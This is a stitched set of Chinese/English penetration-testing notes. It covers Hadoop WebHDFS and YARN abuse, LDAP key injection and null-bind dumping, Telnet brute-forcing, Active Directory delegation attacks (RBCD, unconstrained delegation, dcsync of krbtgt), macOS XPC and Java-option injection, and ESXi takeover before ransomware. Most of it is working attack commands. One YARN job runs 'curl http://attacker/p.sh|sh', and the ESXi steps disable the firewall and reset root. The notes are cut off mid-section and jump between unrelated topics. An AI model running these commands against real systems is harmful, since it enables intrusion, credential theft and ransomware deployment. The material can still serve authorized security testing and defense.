content: 来源路径： 02-知识点/域与Windows/50030-50060-50070-50075-50090：Pentesting Hadoop 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 50030-50060-50070-50075-50090：Pentesting Hadoop 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 50030-50060-50070-50075-50090：Pentesting Hadoop 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 50030-50060-50070-50075-50090：Pentesting Hadoop 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：50030-50060-50070-50075-50090：Pentesting Hadoop、Basic Information、WebHDFS / HttpFS abuse (50070/9870 or 14000)、YARN unauth RCE (8088)、Local PrivEsc from YARN containers (CVE-2023-26031)；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 50030-50060-50070-50075-50090：Pentesting Hadoop Basic Information WebHDFS / HttpFS abuse (50070/9870 or 14000) YARN unauth RCE (8088) Local PrivEsc from YARN containers (CVE-2023-26031) # 核心要点 Unfortunatelly Hadoop lacks support in the Metasploit framework at the time of documentation. However, you can use the following Nmap scripts to enumerate Hadoop services: It's crucial to note that Hadoop operates without 认证 in its default setup. However, for enhanced security, configurations are available to integrate Kerberos with HDFS, YARN, and MapReduce services. If HttpFS is enabled (default port 14000) the same REST paths apply. Behind Kerberos you can still use curl --negotiate -u : with a valid ticket. The ResourceManager REST API accepts job submissions with no auth in default “simple” mode (dr.who). Attackers abuse it to run arbitrary commands (e.g. miners) without needing HDFS write access. # 命令 / 载荷 / 操作片段 # 1. WebHDFS / HttpFS abuse (50070/9870 or 14000) 12345678# list root directorycurl "http://<host>:50070/webhdfs/v1/?op=LISTSTATUS&user.name=hdfs"# read arbitrary file from HDFScurl -L "http://<host>:50070/webhdfs/v1/etc/hadoop/core-site.xml?op=OPEN&user.name=hdfs"# upload a web shell / binarycurl -X PUT -T ./payload "http://<host>:50070/webhdfs/v1/tmp/payload?op=CREATE&overwrite=true&user.name=hdfs" -H 'Content-Type: application/octet-stream' # 2. YARN unauth RCE (8088) 1234567891011121314# 1) get an application idcurl -s -X POST http://<host>:8088/ws/v1/cluster/apps/new-application# 2) submit DistributedShell pointing to a commandcurl -s -X POST http://<host>:8088/ws/v1/cluster/apps \ -H 'Content-Type: application/json' \ -d '{ "application-id":"application_1234567890000_0001", "application-name":"pwn", "am-container-spec":{ "commands":{"command":"/bin/bash -c \"curl http://attacker/p.sh|sh\""} }, "application-type":"YARN" }' # 3. Local PrivEsc from YARN containers (CVE-2023-26031) 123readelf -d /opt/hadoop/bin/container-executor | grep 'RUNPATH\|RPATH'# vulnerable if it contains $ORIGIN/:../lib/native/ls -l /opt/hadoop/bin/container-executor # SUID+root makes it exploitable # 工具与参考入口 Apache Hadoop official CVE list Wiz write-up on CVE-2023-26031 # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 容器与 Kubernetes # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Global Catalog (LDAP in ActiveDirectory) is available by default on ports 3268, and 3269 for LDAPS. LDIF (LDAP Data Interchange Format) defines the directory content as a set of records. It can also represent update requests (Add, Modify, Delete, Rename). On Linux hosts integrated with LDAP/AD, valuable secrets often live in the client configuration, not only on the LDAP server itself. ldap uri and ldap search base: where and what to query ldap default bind dn and ldap default authtok: reusable bind 凭据 id provider / auth provider: tells you whether SSSD is using LDAP, Kerberos, or both world-readable sssd.conf / nslcd.conf cleartext bind 凭据 directory-backed SSH or sudo integrations that turn a readable config into real authz impact If SSL is used you can try to make MITM like the mentioned above but offering a false certificate, if the user accepts it, you are able to Downgrade the 认证 method and see the 凭据 again. Windapsearch is a Python script useful to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries. 下载 Apache Directory from here. You can find an example of how to use this tool here. OpenLDAP directory server # 命令 / 载荷 / 操作片段 # 1. 389, 636, 3268, 3269：Pentesting LDAP 123PORT STATE SERVICE REASON389/tcp open ldap syn-ack636/tcp open tcpwrapped # 2. Write data 123456789# Example from https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/>>> import ldap3>>> server = ldap3.Server('x.x.x.x', port =636, use_ssl = True)>>> connection = ldap3.Connection(server, 'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN', 'PASSWORD', auto_bind=True)>>> connection.bind()True>>> connection.extend.standard.who_am_i()u'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'>>> connection.modify('uid=USER,ou=USERS,dc=DOMAINM=,dc=DOMAIN',{'sshPublicKey': [(ldap3.MODIFY_REPLACE, ['ssh-rsa  badguy@evil'])]}) # 3. Linux client-side LDAP artifacts 123ls -l /etc/sssd/sssd.conf /etc/nslcd.conf /etc/ldap/ldap.conf /etc/krb5.conf 2>/dev/nullsed -n '1,120p' /etc/sssd/sssd.conf 2>/dev/nullsed -n '1,120p' /etc/nslcd.conf 2>/dev/null # 4. Linux client-side LDAP artifacts 1234grep -nE '^(ldap_uri|ldap_search_base|ldap_default_bind_dn|ldap_default_authtok|id_provider|auth_provider)\\s*=' \ /etc/sssd/sssd.conf /etc/nslcd.conf 2>/dev/nullldapsearch -x -H ldap://<target> -D "<bind-dn>" -w '<password>' -b "<base-dn>" # 5. 绕过 TLS SNI check 1ldapsearch -H ldaps://company.com:636/ -x -s base -b '' "(objectClass=*)" "*" + # 6. Anonymous LDAP 枚举 with NetExec (null bind) 123456789# Enumerate objects from the root DSE (base DN autodetected)netexec ldap <DC_FQDN> -u '' -p '' --query "(objectClass=*)" ""# Dump users with key attributes for spraying and targetingnetexec ldap <DC_FQDN> -u '' -p '' --query "(sAMAccountName=*)" ""# Extract just the sAMAccountName field into a listnetexec ldap <DC_FQDN> -u '' -p '' --query "(sAMAccountName=*)" "" \ | awk -F': ' '/sAMAccountName:/ {print $2}' | sort -u

I know it is possible to enumerate this options but I don't know how, so let me know if know how. The telnet-encryption script checks whether the ENCRYPT option is supported; some implementations historically handled this option incorrectly and were vulnerable, but the script only checks support. telnet-ntlm-info discloses NTLM metadata (NetBIOS/DNS/OS build) when Microsoft Telnet NTLM is enabled. CVE-2024-45698 – D-Link Wi-Fi 6 routers (DIR-X4860): Improper input validation in the telnet service allows remote attackers to log in using hard-coded 凭据 and inject OS commands; fixed by firmware 1.04B05 or later. CVE-2023-40478 – NETGEAR RAX30: Stack-based 缓冲区溢出 in the Telnet CLI passwd command enables network-adjacent code execution as root; 认证 is required but can be bypassed. Patch note: inetutils 2.7-2 introduces a sanitize() helper that rejects values starting with：or containing whitespace/metacharacters before substituting them into the login argv, blocking option injection. 检测 /verification: identify exposed daemons with telnetd --version, dpkg -l | grep inetutils, systemctl status inetutils-telnetd, or netstat -tlnp | grep :23. auxiliary/scanner/telnet/telnet version – banner & option 枚举. auxiliary/scanner/telnet/brute telnet – multithreaded bruteforce. auxiliary/scanner/telnet/telnet encrypt overflow – RCE against vulnerable Solaris 9/10 Telnet (option ENCRYPT handling). 利用 /linux/mips/netgear telnetenable – enables telnet service with a crafted packet on many NETGEAR routers. # 命令 / 载荷 / 操作片段 # 1. Basic Information 123/tcp open telnet # 2. Banner Grabbing 1nc -vn <IP> 23 # 3. Banner Grabbing 1nmap -n -sV -Pn --script "*telnet* and safe" -p 23 <IP> # 4. Enumerate Telnet Options / Features 12345678# Detect support for the Telnet ENCRYPT optionnmap -p 23 --script telnet-encryption <IP># Enumerate Microsoft Telnet NTLM info (NetBIOS/DNS/OS build)nmap -p 23 --script telnet-ntlm-info <IP># Brute-force via NSE (alternative to Hydra/Medusa)nmap -p 23 --script telnet-brute --script-args userdb=users.txt,passdb=pass.txt <IP> # 5. Config file 123/etc/inetd.conf/etc/xinetd.d/telnet/etc/xinetd.d/stelnet # 6. HackTricks Automatic Commands 12345678910111213141516171819202122232425262728Protocol_Name: Telnet #Protocol Abbreviation if there is one.Port_Number: 23 #Comma separated if there is more than one.Protocol_Description: Telnet #Protocol Abbreviation Spelled outEntry_1: Name: Notes Description: Notes for t=Telnet Note: | wireshark to hear creds being passed tcp.port == 23 and ip.addr != myip https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-telnet.htmlEntry_2: Name: Banner Grab Description: Grab Telnet Banner Command: nc -vn {IP} 23Entry_3: Name: Nmap with scripts Description: Run nmap scripts for telnet Command: nmap -n -sV -Pn --script "*telnet*" -p 23 {IP}Entry_4: Name: consoleless mfs enumeration Description: Telnet enumeration without the need to run msfconsole Note: sourced from https://github.com/carlospolop/legion Command: msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_version; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/brocade_enable_login; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_encrypt_overflow; set RHOSTS {IP}; set RPORT 23; run; exit' && msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_ruggedcom; set RHOSTS {IP}; set RPORT 23; run; exit' # 7. title: (RBCD) Resource-based constrained 技术笔记
content: 来源路径： 02-知识点/域与Windows/(RBCD) Resource-based constrained 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # (RBCD) Resource-based constrained 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 (RBCD) Resource-based constrained 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 (RBCD) Resource-based constrained 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：(RBCD) Resource-based constrained、Theory、Practice、RBCD on SPN-less users；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 9 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 (RBCD) Resource-based constrained Theory Practice RBCD on SPN-less users # 核心要点 If an account, having the capability to edit the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of another object (e.g. the GenericWrite ACE, see Abusing ACLs), is compromised, an attacker can use it populate that attribute, hence configuring that object for RBCD. Machine accounts can edit their own msDS-AllowedToActOnBehalfOfOtherIdentity attribute, hence allowing RBCD attacks on relayed machine accounts authentications. The common way to conduct these attacks is to create a computer account. This is usually possible thanks to a domain-level attribute called MachineAccountQuota that allows regular users to create up to 10 computer accounts. In the end, an RBCD abuse results in a Service Ticket to authenticate on the target service (B) on behalf of a user. Once the final Service Ticket is obtained, it can be used with Pass-the-Ticket to access the target service (B). A technique called AnySPN or "service class modification" can be used concurrently with pass-the-ticket to change the service class the Service Ticket was destined to (e.g. for the cifs/target.domain.local SPN, the service class is cifs). Impacket's rbcd.py script (Python) can be used to read, write or clear the delegation rights, using the 凭据 of a domain user that has the needed permissions. Step 2: obtain a ticket (delegation operation) 🎫 Step 3: Pass-the-ticket :passport control: # 命令 / 载荷 / 操作片段 # 1. Practice 12345# Read the attributerbcd.py -delegate-to 'target$' -dc-ip 'DomainController' -action 'read' 'domain'/'PowerfulUser':'Password'# Append value to the msDS-AllowedToActOnBehalfOfOtherIdentityrbcd.py -delegate-from 'controlledaccount' -delegate-to 'target$' -dc-ip 'DomainController' -action 'write' 'domain'/'PowerfulUser':'Password' # 2. Practice 1getST.py -spn 'cifs/target' -impersonate Administrator -dc-ip 'DomainController' 'domain/controlledaccountwithSPN:SomePassword' # 3. Practice 12345# Read the security descriptorGet-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount# Populate the msDS-AllowedToActOnBehalfOfOtherIdentitySet-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount 'controlledaccountwithSPN' # 4. Practice 12345678910# Obtain the SID of the controlled account with SPN (e.g. Computer account)$ComputerSid = Get-DomainComputer "controlledaccountwithSPN" -Properties objectsid | Select -Expand objectsid# Build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"$SDBytes = New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDBytes, 0)# set SD in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the target comptuer accountGet-DomainComputer "target$" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} # 5. Practice 12345# Obtain the SID of the controlled account with SPN (e.g. Computer account)StandIn.exe --object samaccountname=controlledaccountwithSPNName# Add the object to the msDS-AllowedToActOnBehalfOfOtherIdentity of the targeted computerStandIn.exe --computer "target" --sid "controlledaccountwithSPN's SID" # 6. Practice 123456789# Import the PowerShell script and show its manualImport-Module .\Invoke-PassTheCert.ps1.\Invoke-PassTheCert.ps1 -?# Authenticate to LDAP/S$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx# List all the available actionsInvoke-PassTheCert -a -NoBanner# Add an object (e.g. WANHADELHEG$) to the msDS-AllowedToActOnBehalfOfOtherIdentity of the targeted computer (e.g. RBESEEDEE$)Invoke-PassTheCert -Action 'LDAPExploit' -LdapConnection $LdapConnection -Exploit 'RBCD' -Identity 'CN=WANHADELHEG,CN=Computers,DC=X' -Target 'CN=RBESEEDEE,CN=Computers,DC=X' # 7. Practice 123456789# Request a TGT for the current userRubeus.exe tgtdeleg /

content: 来源路径： 02-知识点/域与Windows/(KUD) Unconstrained 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # (KUD) Unconstrained 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 (KUD) Unconstrained 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 (KUD) Unconstrained 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：(KUD) Unconstrained、Theory、Practice；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 (KUD) Unconstrained Theory Practice # 核心要点 If the coerced account is "is sensitive and cannot be delegated" or a member of the "Protected Users" group, its TGT will not be delegated in the service ticket used for 认证 against the attacker-controlled KUD account. 非约束委派 abuses are usually combined with an MS-RPRN abuse (printerbug), MS-EFSR abuse (petitpotam), MS-FSRVP abuse (shadowcoerce), r PrivExchange to gain domain admin privileges. === From the attacker machine (UNIX-like) In order to abuse the unconstrained delegations privileges of an account, an attacker must add his machine to its SPNs (i.e. of the compromised account) and add a DNS entry for that name. This allows targets (e.g. Domain Controllers or Exchange servers) to authenticate back to the attacker machine. When attacking accounts able to delegate without constraints, there are two major scenarios # 命令 / 载荷 / 操作片段 # 1. Practice 12345678910111213141516171819202122# 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)addspn.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'# 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNsdnstool.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'# 3. Check that the record was added successfully (after ~3 minutes)nslookup attacker.DOMAIN_FQDN DomainController# 4. Start the krbrelayx listener (the tool needs the right kerberos key to decrypt the ticket it will receive)# 4.a. either specify the salt and password. krbrelayx will calculate the kerberos keyskrbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'# 4.b. or supply the right Kerberos long-term key directlykrbrelayx.py -aesKey aes256-cts-hmac-sha1-96-VALUE# 5. Authentication coercion# PrinterBug, PetitPotam, PrivExchange, ...printerbug.py domain/'vuln_account$'@'DC_IP' -hashes LM:NT 'DomainController'# 6. Check if it works. Krbrelayx should have received and decrypted a ticket, extracting the coerced principal's TGT.# There should be a krbtgt ccache file in the current directory. And it can be used byexport KRB5CCNAME=`pwd`/'krbtgt.ccache' # 2. Practice 1Rubeus.exe monitor /interval:5 # 3. Practice 1Rubeus.exe asktgs /ticket:$base64_extracted_TGT /service:$target_SPN /ptt # 4. Practice 1lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt # 工具与参考入口 is sensitive and cannot be delegated Protected Users sensepost.com addspn Rubeus Mimikatz lsadump::dcsync https://stealthbits.com/blog/unconstrained-delegation-permissions/ https:// 利用.ph/user-constrained-delegation.html https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Abuse 方法论 differs for each scenario. The paths differ but the result is the same: a Service Ticket to authenticate on a target service on behalf of a user. Once the final Service Ticket is obtained, it can be used with Pass-the-Ticket to access the target service. On a side note, a technique called AnySPN or "service class modification" can be used concurrently with pass-the-ticket to change the service class the Service Ticket was destined to (e.g. for the cifs/target.domain.local SPN, the service class is cifs). [-] Kerberos SessionError: KDC ERR BADOPTION(KDC cannot accommodate requested option) When attempting to 利用 that technique, if the error above triggers, it means that either # 命令 / 载荷 / 操作片段 # 1. With protocol transition 1getST -spn "cifs/target" -impersonate "Administrator" "$DOMAIN"/"$USER":"$PASSWORD" # 2. With protocol transition 1Rubeus.exe s4u /nowrap /msdsspn:"cifs/target" /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password" # 3. RBCD approach 1getST -spn "cifs/serviceA" -impersonate "administrator" "domain/serviceB:password" # 4. RBCD approach 1getST -spn "cifs/target" -impersonate "administrator" -additional-ticket "administrator.ccache" "domain/serviceA:password" # 5. RBCD approach 1Rubeus.exe s4u /nowrap /msdsspn:"cifs/target" /impersonateuser:"administrator" /tgs:"base64 | file.kirbi" /domain:"domain" /user:"user" /password:"password" # 工具与参考入口 is sensitive and cannot be delegated Protected Users sensepost.com Impacket getST Rubeus https://snovvcrash.rocks/2022/03/06/abusing-kcd-without-protocol-transition.html # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Dynamic analysis: code execution in a virtual environment to detect suspicious behavior. Heuristics: analysis of code characteristics to detect suspicious behavior. Sandboxing: execution of code in a virtual environment to detect suspicious behavior. Behavioral check: analysis of suspicious behavior of the executed code. Most local root exploits in recent years went through vulnerable XPC services in LaunchDaemons. Every exposed method in a root daemon is a potential escalation vector. The most common 漏洞 class in XPC services is insufficient client verification. The daemon should verify: Audit 令牌 (not PID, which can be reused) XPC services that accept complex objects (NSSecureCoding conformant) can be vulnerable to deserialization attacks: SMJobBless installs a privileged helper that runs as root via launchd. The helper communicates with its parent app via XPC: # 命令 / 载荷 / 操作片段 # 1. Architecture 1234567Client Process (user context) ↓ NSXPCConnection / xpc_connection_create_mach_service() ↓ Mach message via launchdDaemon Process (root context) ↓ Receives XPC message ↓ (Should verify client identity / entitlements) ↓ Performs privileged operation # 2. Finding Daemons with Mach Services 123456789101112131415161718192021# Find all LaunchDaemons with MachServicesfind /Library/LaunchDaemons /System/Library/LaunchDaemons -name "*.plist" -exec sh -c ' plutil -p "{}" 2>/dev/null | grep -q "MachServices" && echo "{}"' \; 2>/dev/null# List active Mach servicessudo launchctl dumpstate 2>/dev/null | grep -E "name = " | sort -u | head -50# List all launchd serviceslaunchctl list# Check a specific daemon's Mach servicesplutil -p /Library/LaunchDaemons/com.example.daemon.plist 2>/dev/null# Using the scannersqlite3 /tmp/executables.db "SELECT e.path, e.privileged, e.isDaemonFROM executables eWHERE e.isDaemon = 1ORDER BY e.privileged DESCLIMIT 50;" # 3. Enumerating XPC Interfaces 12345678# Find the protocol definition in the binarystrings /path/to/daemon | grep -i "protocol\|interface\|xpc\|method"# Use class-dump to extract ObjC protocol definitionsclass-dump /path/to/daemon | grep -A20 "@protocol"# Check for XPC service bundles inside app bundlesfind /Applications -path "*/XPCServices/*.xpc" 2>/dev/null # 4. Vulnerable Pattern: No Verification 12345678// VULNERABLE — daemon accepts any connection- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection { newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyProtocol)]; newConnection.exportedObject = self; [newConnection resume]; return YES; // No verification!} # 5. Vulnerable Pattern: PID-Based Verification (条件竞争) 1234567891011// VULNERABLE — PID can be reused between check and use- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection { pid_t pid = newConnection.processIdentifier; // Attacker can win race: spawn legitimate process → get PID → kill it → exploit process reuses PID if ([self isAuthorizedPID:pid]) { [newConnection resume]; return YES; } return NO;} # 6. Attack: XPC Object Deserialization 123456// If the daemon accepts NSObject subclasses via XPC:// An attacker can send a crafted object that triggers:// 1. Type confusion (wrong class instantiated)// 2. Path traversal (filename objects with ../)// 3. Format string bugs (string objects as format arguments)// 4. Integer overflow (large numeric values) # 7. How Exceptions Enable Sandbox Escape 123456<key>com.apple.security.temporary-exception.mach-lookup.global-name</key><array> <string>com.apple.system.opendirectoryd.api</string> <string>com.apple.SecurityServer</string> <string>com.apple.CoreServices.coreservicesd</string></array> # 8. Finding Applications with Broad Exceptions 1234567891011# Find sandboxed apps with mach-lookup excepti

You could use some of the previous tricks to change the java params and make the process execute arbitrary commands.\ Note how interesting is that Android Studio in this example is trying to load the file /Applications/Android Studio.app.vmoptions, a place where any user from the admin group has write access. # 命令 / 载荷 / 操作片段 # 1. 枚举 12345# Search only in /Applications foldersudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null# Full searchsudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null # 2. \ JAVA OPTIONS 123# Write your payload in a script called /tmp/payload.shexport _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub" # 3. \ JAVA OPTIONS 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#import <Foundation/Foundation.h>// clang -fobjc-arc -framework Foundation invoker.m -o invokerint main(int argc, const char * argv[]) { @autoreleasepool { // Specify the file path and content NSString *filePath = @"/tmp/payload.sh"; NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2"; NSError *error = nil; // Write content to the file BOOL success = [content writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:&error]; if (!success) { NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]); return 1; } NSLog(@"File written successfully to %@", filePath); // Create a new task NSTask *task = [[NSTask alloc] init]; /// Set the task's launch path to use the 'open' command [task setLaunchPath:@"/usr/bin/open"]; // Arguments for the 'open' command, specifying the path to Android Studio [task setArguments:@[@"/Applications/Android Studio.app"]]; // Define custom environment variables NSDictionary *customEnvironment = @{ @"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh" }; // Get the current environment and merge it with custom variables NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]]; [environment addEntriesFromDictionary:customEnvironment]; // Set the task's environment [task setEnvironment:environment]; // Launch the task [task launch]; } return 0;} # 4. \ JAVA OPTIONS 123456export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"# Oropen --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional" # 5. \ JAVA OPTIONS 1234567891011121314import java.io.*;import java.lang.instrument.*;public class Agent { public static void premain(String args, Instrumentation inst) { try { String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" }; Runtime.getRuntime().exec(commands); } catch (Exception err) { err.printStackTrace(); } }} # 6. \ JAVA OPTIONS 12javac Agent.java # Create Agent.classjar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar # 7. \ JAVA OPTIONS 1234Premain-Class: AgentAgent-Class: AgentCan-Redefine-Classes: trueCan-Retransform-Classes: true # 8. \ JAVA OPTIONS 123456export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"# Oropen --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional" # 9. vmoptions file 12345678/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app

Router code that maps attacker-controlled path/query values directly into privileged actions such as logout, wallet transfer, KYC steps, or account linking. This is useful for quickly replaying 载荷 while observing logs, breakpoints, Frida hooks, or proxy traffic. On a real device, the same 载荷 can be delivered from Notes, Safari, Messages, QR codes, or a helper application that calls UIApplication.open. Fuzzing URL schemes can identify parsing bugs and, in rare cases, memory-corruption bugs. 工具 like Frida can automate this process by opening URLs with varying 载荷 to monitor for crashes, exemplified by the manipulation of URLs in the iGoat-Swift app: Useful 载荷 classes: Many iOS apps implement x-callback-url semantics on top of custom schemes, commonly exposing x-success, x-error, and x-cancel parameters. From a pentest perspective, this creates two recurring attack surfaces: Avoids placing secrets or bearer-like tokens in callback URLs. # 命令 / 载荷 / 操作片段 # 1. Testing URL Handling and Validation 12345678910111213func scene(_ scene: UIScene, willConnectTo session: UISceneSession, options connectionOptions: UIScene.ConnectionOptions) { if let urlContext = connectionOptions.urlContexts.first { let url = urlContext.url // parse and route the URL }}func scene(_ scene: UIScene, openURLContexts URLContexts: Set<UIOpenURLContext>) { guard let url = URLContexts.first?.url else { return } // parse and route the URL} # 4. Infiltrate: compromise vSphere management, enumerate hosts, steal data, and stage 载荷. Once command execution on an ESXi console/SSH session is obtained, attackers typically run the following management commands to fingerprint and isolate the host before ransomware deployment: Lightweight management agents expose a concise instruction set parsed from the C2 queue. That set is enough to operate dozens of compromised hypervisors without interactive shells: Already processed files are skipped when their names contain .emario, .marion, .lmario, .nmario, .mmario or .wmario, preventing double encryption that would break the attackers' decryptor. Encrypted 载荷 are renamed with a *.mario-style suffix (commonly .emario) so operators can verify coverage remotely in consoles or datastore listings. Key schedule: Generate a 32-byte primary key (stored around var 1150) and an independent 8-byte secondary key (var 20). Data is first transformed with the primary context and then re-mixed with the secondary key before disk writes. Per-file headers: Metadata buffers (e.g. var 40) track chunk maps and flags so the attackers' private decryptor can reconstruct the sparse layout. # 命令 / 载荷 / 操作片段 # 1. 枚举 123nmap -sV --script "http-vmware-path-vuln or vmware-version" -p <PORT> <IP>msf> use auxiliary/scanner/vmware/esx_fingerprintmsf> use auxiliary/scanner/http/ms15_034_http_sys_memory_dump # 2. Bruteforce 1msf> auxiliary/scanner/vmware/vmware_http_login # 3. Hypervisor Takeover Primitives 123456uname -a # hostname / build metadata for trackingesxcli --formatter=csv network nic list # adapter + MAC inventoryesxcli --formatter=csv network ip interface ipv4 getesxcli network firewall set --enabled false/etc/init.d/vpxa stop # cut vCenter off from the hostpasswd root # rotate credentials under attacker control # 工具与参考入口 Unit 42 – From Linear to Complex: An Upgrade in RansomHouse Encryption # 检查清单 是否确认授权范围与目标集合 是否区分被动线索和主动探测结果 是否保留输入列表与输出摘要 是否把结果回写到资产 / 服务图谱 # 关联 侦察与枚举总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

